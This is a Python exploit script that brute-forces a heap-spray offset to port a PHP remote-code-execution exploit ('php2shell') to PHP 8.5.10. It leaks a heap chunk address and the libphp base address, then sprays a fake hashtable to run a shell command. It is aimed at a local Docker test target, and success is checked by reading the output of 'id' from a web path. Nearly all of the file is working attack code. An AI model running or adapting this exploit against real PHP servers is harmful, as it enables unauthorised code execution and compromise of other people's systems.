#!/usr/bin/env python3
"""8.5.10 fallback: try the ORIGINAL 9bie spray (cheap_oom_a + fake_ref_b) with a scanned
s_off (fake-array offset from the chunk base). The 9bie spray works on 8.3.35 (s_off=0xF6398)
and 8.4.26 (s_off=0xF8398); find the 8.5.10 value."""
import sys, time
sys.path.insert(0, r"C:\Users\likat\p2s52704\test\poc8510")
import importlib.util
spec = importlib.util.spec_from_file_location("p2s",
    r"C:\Users\likat\p2s52704\test\poc8510\php2shell.py")
p2s = importlib.util.module_from_spec(spec); spec.loader.exec_module(p2s)
import urllib.request, urllib.error

HOST, PORT, TLS = "127.0.0.1", 18116, False
CFG = p2s.VERSIONS["8.5.10"]
CMD = b"id>/www/p1"
BASE = "http://%s:%d" % (HOST, PORT)

def http_get(url, timeout=12.0):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        try: return e.code, e.read()
        except Exception: return e.code, b""
    except Exception as e:
        return 0, str(e).encode()

def leak_once():
    t = p2s.Target(BASE + "/", timeout=30)
    ex = p2s.Exploit(t, CMD.decode(), CFG["zif"], CFG["dtor"], CFG["htdata"])
    ex.rotate()
    chunk = 0
    for _ in range(4):
        ex.rotate(); chunk = ex.stage1()
        if chunk: break
    if not chunk: return None
    ex.rotate()
    libphp = 0
    for _ in range(4):
        ex.rotate(); libphp = ex.stage2()
        if libphp: break
    if not libphp: return None
    return chunk, libphp

def spray_once(s_off):
    chunk, libphp = leak_once()
    if not (chunk and libphp): return False
    S = chunk + s_off
    zif = libphp + CFG["zif"]
    ht = p2s.build_ht(S, zif, CMD, size=384)
    p2s.oom_a(HOST, PORT, TLS, 880, 64, 115)
    time.sleep(0.3)
    p2s.fake_ref_b(HOST, PORT, TLS, S, ht, 384, 500, 495)
    time.sleep(0.8)
    code, body = http_get(BASE + "/p1")
    return code == 200 and b"uid=" in body

def main():
    import subprocess
    # s_off candidates: 8.3.35 (0xF6398), 8.4.26 (0xF8398), and a range around them
    cands = [0xF6398, 0xF8398,
             0xF7398, 0xF9398, 0xF5398, 0xF4398, 0xFA398, 0xFB398,
             0xF6000, 0xF7000, 0xF8000, 0xF9000, 0xFA000,
             0xF0000, 0xFF398, 0xEF398]
    for s_off in cands:
        t0 = time.time()
        try:
            ok = spray_once(s_off)
        except Exception as e:
            print("s_off=0x%x  ERR %r" % (s_off, e), flush=True)
            continue
        print("s_off=0x%x  %5.1fs  %s" % (s_off, time.time()-t0,
              "RCE!" if ok else "404/miss"), flush=True)
        if ok:
            code, body = http_get(BASE + "/p1")
            print("!!! FOUND s_off=0x%x  %s" % (s_off, body.decode().strip()), flush=True)
            return 0
        subprocess.run(["docker", "exec", "p2s8510", "rm", "-f", "/www/p1"],
                       capture_output=True)
    print("no s_off landed", flush=True)
    return 1

if __name__ == "__main__":
    sys.exit(main())
